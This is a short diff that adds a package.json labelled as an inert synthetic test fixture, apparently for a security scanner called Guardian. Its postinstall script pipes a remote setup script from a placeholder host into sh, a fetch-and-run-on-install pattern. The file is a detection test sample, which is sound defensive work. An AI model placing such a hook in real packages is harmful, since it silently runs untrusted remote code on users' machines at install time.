@@ -1,0 +1,9 @@
+{
+  "name": "guardian-installer-example",
+  "version": "0.0.0",
+  "private": true,
+  "description": "Inert synthetic Guardian test fixture. Never execute.",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/setup.sh | sh"
+  }
+}
